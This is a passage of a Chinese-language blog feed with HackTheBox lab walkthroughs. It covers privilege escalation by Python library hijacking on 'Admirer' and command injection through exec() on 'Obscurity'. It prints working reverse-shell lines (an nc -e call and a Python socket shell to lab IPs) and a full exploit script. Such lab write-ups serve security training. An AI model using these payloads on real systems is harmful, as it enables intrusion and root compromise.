view_uptime ;;</span><br><span class="line">        2) view_users ;;</span><br><span class="line">        3) view_crontab ;;</span><br><span class="line">        4) backup_passwd ;;</span><br><span class="line">        5) backup_shadow ;;</span><br><span class="line">        6) backup_web ;;</span><br><span class="line">        7) backup_db ;;</span><br><span class="line"></span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;Unknown option.&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive way, to be called from the command line</span></span><br><span class="line">options=(<span class="string">&quot;View system uptime&quot;</span></span><br><span class="line">         <span class="string">&quot;View logged in users&quot;</span></span><br><span class="line">         <span class="string">&quot;View crontab&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup passwd file&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup shadow file&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup web data&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup DB&quot;</span></span><br><span class="line">         <span class="string">&quot;Quit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[[[ System Administration Menu ]]]&quot;</span></span><br><span class="line">PS3=<span class="string">&quot;Choose an option: &quot;</span></span><br><span class="line">COLUMNS=11</span><br><span class="line">select opt <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;options[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$REPLY</span> <span class="keyword">in</span></span><br><span class="line">        1) view_uptime ; <span class="built_in">break</span> ;;</span><br><span class="line">        2) view_users ; <span class="built_in">break</span> ;;</span><br><span class="line">        3) view_crontab ; <span class="built_in">break</span> ;;</span><br><span class="line">        4) backup_passwd ; <span class="built_in">break</span> ;;</span><br><span class="line">        5) backup_shadow ; <span class="built_in">break</span> ;;</span><br><span class="line">        6) backup_web ; <span class="built_in">break</span> ;;</span><br><span class="line">        7) backup_db ; <span class="built_in">break</span> ;;</span><br><span class="line">        8) <span class="built_in">echo</span> <span class="string">&quot;Bye!&quot;</span> ; <span class="built_in">break</span> ;;</span><br><span class="line"></span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;Unknown option.&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
<p>在几个需要root权限运行的函数中，<code>backup_web()</code>调用了同目录下的<code>backup.py</code>脚本文件。</p>
<p><a href="http://backup.py">backup.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> shutil <span class="keyword">import</span> make_archive</span><br><span class="line"></span><br><span class="line">src = <span class="string">&#x27;/var/www/html/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># old ftp directory, not used anymore</span></span><br><span class="line"><span class="comment">#dst = &#x27;/srv/ftp/html&#x27;</span></span><br><span class="line"></span><br><span class="line">dst = <span class="string">&#x27;/var/backups/html&#x27;</span></span><br><span class="line"></span><br><span class="line">make_archive(dst, <span class="string">&#x27;gztar&#x27;</span>, src)</span><br></pre></td></tr></table></figure>
<p>这里引用了shutil模块中的<code>make_archive</code>函数，这个地方得用Python库劫持的方法提权：</p>
<blockquote>
<p><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/</a></p>
</blockquote>
<p>查看当前Python库的路径：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waldo@admirer:&#x2F;opt&#x2F;scripts$ python3 -c &#39;import sys; print (&quot;\n&quot;.join(sys.path))&#39;</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python35.zip</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python3.5</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python3.5&#x2F;plat-x86_64-linux-gnu</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python3.5&#x2F;lib-dynload</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.5&#x2F;dist-packages</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages</span><br></pre></td></tr></table></figure>
<p>但是我们都没有权限写入文件到这些路径，但是我们可以使用<code>PYTHONPATH</code>来临时更改Python库的路径</p>
<p>首先伪造一个shutil.py库文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waldo@admirer:&#x2F;opt&#x2F;scripts$ cd</span><br><span class="line">waldo@admirer:~$ mkdir fakelib</span><br><span class="line">waldo@admirer:~$ cd fakelib&#x2F;</span><br><span class="line">waldo@admirer:~&#x2F;fakelib$ nano shutil.py </span><br><span class="line">waldo@admirer:~&#x2F;fakelib$ cat shutil.py </span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def make_archive(a, b, c):</span><br><span class="line">    os.system(&quot;nc 10.10.14.4 1234 -e &#39;&#x2F;bin&#x2F;sh&#39;&quot;)</span><br></pre></td></tr></table></figure>
<p>靶机运行脚本文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">waldo@admirer:~/fakelib$ sudo PYTHONPATH=~/fakelib /opt/scripts/admin_tasks.sh </span><br><span class="line">[sudo] password <span class="keyword">for</span> waldo: </span><br><span class="line"></span><br><span class="line">[[[ System Administration Menu ]]]</span><br><span class="line">1) View system uptime</span><br><span class="line">2) View logged <span class="keyword">in</span> users</span><br><span class="line">3) View crontab</span><br><span class="line">4) Backup passwd file</span><br><span class="line">5) Backup shadow file</span><br><span class="line">6) Backup web data</span><br><span class="line">7) Backup DB</span><br><span class="line">8) Quit</span><br><span class="line">Choose an option: 6</span><br><span class="line">Running backup script <span class="keyword">in</span> the background, it might take a <span class="keyword">while</span>...</span><br></pre></td></tr></table></figure>
<p>本机上监听1234端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -lvnp 1234</span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.187] 58946</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">root@admirer:&#x2F;home&#x2F;waldo&#x2F;fakelib# id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@admirer:&#x2F;home&#x2F;waldo&#x2F;fakelib# cd   </span><br><span class="line">cd</span><br><span class="line">root@admirer:~# cat root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">c6af------------------------4645</span><br></pre></td></tr></table></figure>
<p>ROOTED！！！</p>
<h2 id="0x04-Summary">0x04 Summary</h2>
<ul>
<li>nmap扫描出 <code>admin-dir</code>目录，访问发现403 Forbidden</li>
<li>使用wfuzz工具扫描出 <code>contacts.txt</code> 和<code>credentials.txt</code>两个文件</li>
<li>用<code>credentials.txt</code>文件暴露出来的FTP用户名和密码登录靶机FTP服务</li>
<li>下载<code>dump.sql</code>文件和<code>html.tar.gz</code>并解压</li>
<li><code>utility-scripts</code>目录中有MySQL的登录名和密码</li>
<li>wfuzz<code>utility-scripts</code>目录发现 <code>adminer.php</code></li>
<li>上面用户名和密码不能登录adminer</li>
<li>Google发现一个adminer漏洞的公开利用方式</li>
<li>在本地运行MySQL服务，并且新建用户允许任意主机接入，配置MySQL外部可访问</li>
<li>用靶机的adminer服务连接本地数据库</li>
<li>将index.php写入本地数据库</li>
<li>得到waldo的用户名和密码，用SSH登录</li>
<li>拿到<code>user.txt</code></li>
<li>运行<code>sudo -l</code>命令，查看有权限执行的脚本<code>admin_task.sh</code></li>
<li><code>admin_task.sh</code>会调用<code>backup.py</code></li>
<li><code>Python</code> <strong>library</strong> <code>path</code> <strong>hijacking</strong> 提权</li>
<li>伪造<code>shutil.py</code>，写入reverse shell</li>
<li>sudo运行<code>admin_task.sh</code>时指定 <code>PYTHONPATH</code></li>
<li>拿到 <code>root.txt</code></li>
</ul>
<h2 id="0x05-Reference">0x05 Reference</h2>
<table>
<thead>
<tr>
<th>Topic</th>
<th>Url</th>
</tr>
</thead>
<tbody>
<tr>
<td>Adminer-database Manager</td>
<td><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a></td>
</tr>
<tr>
<td>Adminer-Database Manager</td>
<td><a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability">https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability</a></td>
</tr>
<tr>
<td>Configuration of Mysql</td>
<td><a href="https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql">https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql</a></td>
</tr>
<tr>
<td>Configuration of Mysql</td>
<td><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql">https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql</a></td>
</tr>
<tr>
<td>Python Path Hijacting</td>
<td><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/</a></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Obscurity Walkthrough</title>
    <url>/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Obscurity-Walkthrough">HTB::Obscurity Walkthrough</h1>
<h2 id="0x01-Introduction">0x01 Introduction</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215205639.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>wfuzz</li>
<li>Python代码审计</li>
<li>代码执行漏洞</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>Nmap扫描端口发现开放了 <code>8080</code> 的web端口</p>
<p>页面提示有一个源码泄露</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Message to server devs: the current source code for the web server is in &#39;SuperSecureServer.py&#39; in the secret development directory</span><br></pre></td></tr></table></figure>
<p>那我们就需要爆破目录了，使用 <code>wfuzz</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</span><br></pre></td></tr></table></figure>
<p>得到服务器源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">respTemplate = <span class="string">&quot;&quot;&quot;HTTP/1.1 &#123;statusNum&#125; &#123;statusCode&#125;</span></span><br><span class="line"><span class="string">Date: &#123;dateSent&#125;</span></span><br><span class="line"><span class="string">Server: &#123;server&#125;</span></span><br><span class="line"><span class="string">Last-Modified: &#123;modified&#125;</span></span><br><span class="line"><span class="string">Content-Length: &#123;length&#125;</span></span><br><span class="line"><span class="string">Content-Type: &#123;contentType&#125;</span></span><br><span class="line"><span class="string">Connection: &#123;connectionType&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;body&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">DOC_ROOT = <span class="string">&quot;DocRoot&quot;</span></span><br><span class="line"></span><br><span class="line">CODES = &#123;<span class="string">&quot;200&quot;</span>: <span class="string">&quot;OK&quot;</span>, </span><br><span class="line">        <span class="string">&quot;304&quot;</span>: <span class="string">&quot;NOT MODIFIED&quot;</span>,</span><br><span class="line">        <span class="string">&quot;400&quot;</span>: <span class="string">&quot;BAD REQUEST&quot;</span>, <span class="string">&quot;401&quot;</span>: <span class="string">&quot;UNAUTHORIZED&quot;</span>, <span class="string">&quot;403&quot;</span>: <span class="string">&quot;FORBIDDEN&quot;</span>, <span class="string">&quot;404&quot;</span>: <span class="string">&quot;NOT FOUND&quot;</span>, </span><br><span class="line">        <span class="string">&quot;500&quot;</span>: <span class="string">&quot;INTERNAL SERVER ERROR&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">MIMES = &#123;<span class="string">&quot;txt&quot;</span>: <span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;css&quot;</span>:<span class="string">&quot;text/css&quot;</span>, <span class="string">&quot;html&quot;</span>:<span class="string">&quot;text/html&quot;</span>, <span class="string">&quot;png&quot;</span>: <span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;jpg&quot;</span>:<span class="string">&quot;image/jpg&quot;</span>, </span><br><span class="line">        <span class="string">&quot;ttf&quot;</span>:<span class="string">&quot;application/octet-stream&quot;</span>,<span class="string">&quot;otf&quot;</span>:<span class="string">&quot;application/octet-stream&quot;</span>, <span class="string">&quot;woff&quot;</span>:<span class="string">&quot;font/woff&quot;</span>, <span class="string">&quot;woff2&quot;</span>: <span class="string">&quot;font/woff2&quot;</span>, </span><br><span class="line">        <span class="string">&quot;js&quot;</span>:<span class="string">&quot;application/javascript&quot;</span>,<span class="string">&quot;gz&quot;</span>:<span class="string">&quot;application/zip&quot;</span>, <span class="string">&quot;py&quot;</span>:<span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;map&quot;</span>: <span class="string">&quot;application/octet-stream&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, **kwargs</span>):</span></span><br><span class="line">        self.__dict__.update(kwargs)</span><br><span class="line">        now = datetime.now()</span><br><span class="line">        self.dateSent = self.modified = now.strftime(<span class="string">&quot;%a, %d %b %Y %H:%M:%S&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stringResponse</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> respTemplate.format(**self.__dict__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, request</span>):</span></span><br><span class="line">        self.good = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            request = self.parseRequest(request)</span><br><span class="line">            self.method = request[<span class="string">&quot;method&quot;</span>]</span><br><span class="line">            self.doc = request[<span class="string">&quot;doc&quot;</span>]</span><br><span class="line">            self.vers = request[<span class="string">&quot;vers&quot;</span>]</span><br><span class="line">            self.header = request[<span class="string">&quot;header&quot;</span>]</span><br><span class="line">            self.body = request[<span class="string">&quot;body&quot;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            self.good = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parseRequest</span>(<span class="params">self, request</span>):</span>        </span><br><span class="line">        req = request.strip(<span class="string">&quot;\r&quot;</span>).split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        method,doc,vers = req[<span class="number">0</span>].split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        header = req[<span class="number">1</span>:<span class="number">-3</span>]</span><br><span class="line">        body = req[<span class="number">-1</span>]</span><br><span class="line">        headerDict = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> header:</span><br><span class="line">            pos = param.find(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">            key, val = param[:pos], param[pos+<span class="number">2</span>:]</span><br><span class="line">            headerDict.update(&#123;key: val&#125;)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;method&quot;</span>: method, <span class="string">&quot;doc&quot;</span>: doc, <span class="string">&quot;vers&quot;</span>: vers, <span class="string">&quot;header&quot;</span>: headerDict, <span class="string">&quot;body&quot;</span>: body&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port</span>):</span>    </span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.sock.bind((self.host, self.port))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listen</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client, address = self.sock.accept()</span><br><span class="line">            client.settimeout(<span class="number">60</span>)</span><br><span class="line">            threading.Thread(target = self.listenToClient,args = (client,address)).start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listenToClient</span>(<span class="params">self, client, address</span>):</span></span><br><span class="line">        size = <span class="number">1024</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = client.recv(size)</span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                    <span class="comment"># Set the response to echo back the recieved data </span></span><br><span class="line">                    req = Request(data.decode())</span><br><span class="line">                    self.handleRequest(req, client, address)</span><br><span class="line">                    client.shutdown()</span><br><span class="line">                    client.close()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> error(<span class="string">&#x27;Client disconnected&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                client.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handleRequest</span>(<span class="params">self, request, conn, address</span>):</span></span><br><span class="line">        <span class="keyword">if</span> request.good:</span><br><span class="line"><span class="comment">#            try:</span></span><br><span class="line">                <span class="comment"># print(str(request.method) + &quot; &quot; + str(request.doc), end=&#x27; &#x27;)</span></span><br><span class="line">                <span class="comment"># print(&quot;from &#123;0&#125;&quot;.format(address[0]))</span></span><br><span class="line"><span class="comment">#            except Exception as e:</span></span><br><span class="line"><span class="comment">#                print(e)</span></span><br><span class="line">            document = self.serveDoc(request.doc, DOC_ROOT)</span><br><span class="line">            statusNum=document[<span class="string">&quot;status&quot;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            document = self.serveDoc(<span class="string">&quot;/errors/400.html&quot;</span>, DOC_ROOT)</span><br><span class="line">            statusNum=<span class="string">&quot;400&quot;</span></span><br><span class="line">        body = document[<span class="string">&quot;body&quot;</span>]</span><br><span class="line">        </span><br><span class="line">        statusCode=CODES[statusNum]</span><br><span class="line">        dateSent = <span class="string">&quot;&quot;</span></span><br><span class="line">        server = <span class="string">&quot;BadHTTPServer&quot;</span></span><br><span class="line">        modified = <span class="string">&quot;&quot;</span></span><br><span class="line">        length = len(body)</span><br><span class="line">        contentType = document[<span class="string">&quot;mime&quot;</span>] <span class="comment"># Try and identify MIME type from string</span></span><br><span class="line">        connectionType = <span class="string">&quot;Closed&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        resp = Response(</span><br><span class="line">        statusNum=statusNum, statusCode=statusCode, </span><br><span class="line">        dateSent = dateSent, server = server, </span><br><span class="line">        modified = modified, length = length, </span><br><span class="line">        contentType = contentType, connectionType = connectionType, </span><br><span class="line">        body = body</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        data = resp.stringResponse()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        conn.send(data.encode())</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serveDoc</span>(<span class="params">self, path, docRoot</span>):</span></span><br><span class="line">        path = urllib.parse.unquote(path)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = <span class="string">&quot;output = &#x27;Document: &#123;&#125;&#x27;&quot;</span> <span class="comment"># Keep the output for later debug</span></span><br><span class="line">            exec(info.format(path)) <span class="comment"># This is how you do string formatting, right?</span></span><br><span class="line">            cwd = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">            docRoot = os.path.join(cwd, docRoot)</span><br><span class="line">            <span class="keyword">if</span> path == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">                path = <span class="string">&quot;/index.html&quot;</span></span><br><span class="line">            requested = os.path.join(docRoot, path[<span class="number">1</span>:])</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(requested):</span><br><span class="line">                mime = mimetypes.guess_type(requested)</span><br><span class="line">                mime = (mime <span class="keyword">if</span> mime[<span class="number">0</span>] != <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">                mime = MIMES[requested.split(<span class="string">&quot;.&quot;</span>)[<span class="number">-1</span>]]</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> open(requested, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        data = f.read()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">with</span> open(requested, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        data = f.read()</span><br><span class="line">                status = <span class="string">&quot;200&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                errorPage = os.path.join(docRoot, <span class="string">&quot;errors&quot;</span>, <span class="string">&quot;404.html&quot;</span>)</span><br><span class="line">                mime = <span class="string">&quot;text/html&quot;</span></span><br><span class="line">                <span class="keyword">with</span> open(errorPage, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    data = f.read().format(path)</span><br><span class="line">                status = <span class="string">&quot;404&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            errorPage = os.path.join(docRoot, <span class="string">&quot;errors&quot;</span>, <span class="string">&quot;500.html&quot;</span>)</span><br><span class="line">            mime = <span class="string">&quot;text/html&quot;</span></span><br><span class="line">            <span class="keyword">with</span> open(errorPage, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">            status = <span class="string">&quot;500&quot;</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;body&quot;</span>: data, <span class="string">&quot;mime&quot;</span>: mime, <span class="string">&quot;status&quot;</span>: status&#125;</span><br></pre></td></tr></table></figure>
<p>审计源码，大致说一下代码的含义，开启socket监听，接收到http请求，调用 <code>Request</code> 类的 <code>parseRequest</code> 方法做分割，然后调用 <code>handleRequest</code> 处理请求，通过 <code>serveDoc</code> 处理请求的文档。</p>
<p>查找敏感函数发现关键点：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serveDoc</span>(<span class="params">self, path, docRoot</span>):</span></span><br><span class="line">    path = urllib.parse.unquote(path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        info = <span class="string">&quot;output = &#x27;Document: &#123;&#125;&#x27;&quot;</span> <span class="comment"># Keep the output for later debug</span></span><br><span class="line">        exec(info.format(path)) <span class="comment"># This is how you do string formatting, right?</span></span><br><span class="line">        cwd = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        docRoot = os.path.join(cwd, docRoot)</span><br></pre></td></tr></table></figure>
<p>这里的path是污点参数，exec函数存在命令注入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path = <span class="string">&quot;\&#x27;;os.system(&#x27;whoami&#x27;)#&quot;</span></span><br></pre></td></tr></table></figure>
<p>然后通过python反弹shell：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://10.10.10.168:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;5\&#x27;&#x27;</span>+<span class="string">&#x27;\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.146&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])\na=\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = urllib.parse.quote(path)</span><br><span class="line">print(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">print(url+payload)</span><br><span class="line"></span><br><span class="line">r= requests.get(url+payload)</span><br><span class="line">print(r.headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Python 反弹shell讲解：<a href="https://www.leavesongs.com/PYTHON/python-shell-backdoor.html">https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</a></p>
</blockquote>
<p>进入robert目录：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200306170536.png" alt=""></p>
<p>查看敏感文件</p>
<p>check.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Encrypting this file with your key should result in out.txt, make sure your key is correct!</span><br></pre></td></tr></table></figure>
<p>chect.txt加密后的结果是out.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@obscure:&#x2F;home&#x2F;robert$ xxd out.txt</span><br><span class="line">xxd out.txt</span><br><span class="line">00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................</span><br><span class="line">00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................</span><br><span class="line">00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................</span><br><span class="line">00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................</span><br><span class="line">00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................</span><br><span class="line">00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................</span><br><span class="line">00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................</span><br><span class="line">00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................</span><br><span class="line">00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................</span><br><span class="line">00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................</span><br><span class="line">000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................</span><br><span class="line">000000b0: c38c c397 c289 c281 76                   ........v</span><br></pre></td></tr></table></figure>
<p>passwordreminder.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@obscure:&#x2F;home&#x2F;robert$ xxd passwordreminder.txt</span><br><span class="line">xxd passwordreminder.txt</span><br><span class="line">00000000: c2b4 c391 c388 c38c c389 c3a0 c399 c381  ................</span><br><span class="line">00000010: c391 c3a9 c2af c2b7 c2bf 6b              ..........k</span><br></pre></td></tr></table></figure>
<p><a href="http://SuperSecureCrypt.py">SuperSecureCrypt.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    encrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr = chr((newChr + ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        encrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr 